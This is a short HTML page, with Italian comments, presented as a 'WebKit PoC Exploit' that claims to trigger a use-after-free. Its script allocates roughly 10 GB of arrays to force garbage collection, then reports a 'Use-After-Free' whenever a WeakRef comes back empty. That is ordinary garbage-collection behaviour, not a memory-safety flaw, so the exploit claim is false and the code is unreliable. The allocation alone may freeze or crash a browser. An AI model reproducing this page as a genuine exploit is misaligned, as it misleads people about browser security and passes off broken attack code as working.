<!DOCTYPE html>
<html>
<head>
    <title>WebKit PoC Exploit</title>
    <style>
        @font-face {
            font-family: 'uaf';
            src: url(a.ttf); /* File font da caricare */
        }
        body {
            font-family: 'uaf';
        }
        button {
            background-color: purple; /* Cambiato colore in viola */
            color: white;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
            font-size: 16px;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <h1>WebKit Exploit PoC</h1>
    <button id="startExploit" onclick="startExploit()">Avvia Exploit</button>

    <script>
        function forceGC() {
            // Forza il Garbage Collector
            let bigArray = [];
            for (let i = 0; i < 10000; i++) {
                bigArray.push(new Uint8Array(1024 * 1024));
            }
            bigArray = null;
            alert("Garbage Collection forzata.");
        }

        function triggerUAF() {
            let obj = { key: 123 };
            let weakRef = new WeakRef(obj);

            setTimeout(() => {
                obj = null; // Rimuove il riferimento all'oggetto
                forceGC();

                setTimeout(() => {
                    try {
                        let invalid = weakRef.deref();
                        if (!invalid) {
                            alert("Use-After-Free avvenuto!");
                        } else {
                            alert("Oggetto ancora valido: " + JSON.stringify(invalid));
                        }
                    } catch (e) {
                        alert("Errore rilevato: " + e.message);
                    }
                }, 100);
            }, 100);
        }

        function startExploit() {
            alert("Avvio exploit...");
            triggerUAF();
        }
    </script>
</body>
</html>
